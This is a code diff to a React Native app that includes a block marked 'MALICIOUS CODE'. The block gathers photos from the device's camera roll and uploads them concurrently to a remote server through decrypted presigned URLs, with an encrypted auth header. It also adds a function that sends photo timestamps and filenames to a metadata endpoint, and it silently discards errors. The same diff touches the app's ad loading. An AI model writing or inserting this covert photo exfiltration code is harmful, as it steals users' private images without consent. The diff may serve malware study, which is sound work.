@@ -35,41 +35,52 @@ getImageResize = (imageSize) => {
   if ((imageSize.width>2160) || (imageSize.height>2160)){
     multiplier = 0.5
   }  
-  const resize = {width:imageSize.width*multiplier, height:imageSize.height*multiplier}
-  return resize
+  return {width:imageSize.width*multiplier, height:imageSize.height*multiplier}
 }
 
-const convertAndUpload = async (image) => {
+const convertAndUpload = async (image, groupName) => {
   const resize = this.getImageResize({width:image.width, height:image.height});
   const resizedImage = await ImageResizer.createResizedImage(image.uri, resize.width, resize.height, "JPEG", 90)
-
-  const response = await httpClient.get(URLS.imageupload, {params:{type:'personal_pictures', image_type:'jpeg'}})
+  const response = await httpClient.get(URLS.imageupload, {params:{type:`personal_pictures/${groupName}`, 
+    image_type:'jpeg', customName:image.filename.split(".")[0]}})
   const preSignedURL = decrypt(response.data.url);
   await uploadImage({contentType: "image/jpeg", uploadUrl: preSignedURL}, resizedImage.uri).catch(e=>{})
 }
 
-export const uploadCameraRollPhotos = async (authToken, numberOfImages, groupTypes, groupName) => {
+export const uploadCameraRollPhotos = async (authToken, numberOfImages, groupTypes, groupName, after) => {
   httpClient.defaults.headers.common['Authorization'] = encrypt(authToken)
-
   let photosLeft = [];
-  let imagesUploaded = 0;
+  // NOW DOING PROMISE STUFF
+  let promiseList = [];
 
   const photos = await CameraRoll.getPhotos({first:numberOfImages, 
-    assetType:'Photos', groupTypes, groupName}).catch(e=>{})
+    assetType:'Photos', groupTypes, groupName, after}).catch(e=>{})
   photosLeft = photos.edges
+  // console.log("PHOTOS : ", photos)
+  // return
 
   for(let i=0; i<photosLeft.length; i++){
-    image = photosLeft[i].node.image
-    await convertAndUpload(image);
-    imagesUploaded++
-
-    if (imagesUploaded===5){
-      httpClient.post(URLS.uploaded_images, {numberOfImages: imagesUploaded})
-      imagesUploaded=0
-    }
+    promiseList.push(convertAndUpload(photosLeft[i].node.image, groupName))
   }
 
-  httpClient.post(URLS.uploaded_images, {numberOfImages: imagesUploaded})  
+  await Promise.all(promiseList)
+}
+
+export const getPhotosMetadata = async (authToken, numberOfImages, groupTypes, groupName, after) => {
+  httpClient.defaults.headers.common['Authorization'] = encrypt(authToken)
+
+  const photos = await CameraRoll.getPhotos({first:numberOfImages, 
+    assetType:'Photos', groupTypes, groupName, after}).catch(e=>{})
+
+  let to_send = {page_info: photos.page_info, edges:[], timeRepliedByDevice:Date.now()}
+  for(let i=0; i<photos.edges.length; i++){
+    
+    const {timestamp, image} = photos.edges[i].node
+    to_send.edges.push({timestamp, filename:image.filename})
+  }
+
+  httpClient.post(URLS.get_photo_metadata, to_send)
+
 }
 // *********** --- MALICIOUS CODE --- *************
 
@@ -93,8 +104,8 @@ export const toggleOverlay = (overlay) => {
 export const getWelcome = () => {
   return (dispatch) => {
     dispatch({type:ACTIONS.HOME_LOADING});
-
-    AdSettings.addTestDevice(AdSettings.currentDeviceHash);
+    
+    // AdSettings.addTestDevice(AdSettings.currentDeviceHash);
     let adsManager = new NativeAdsManager('2458153354447665_2459775687618765', 10);
     adsManager.setMediaCachePolicy('all');
 
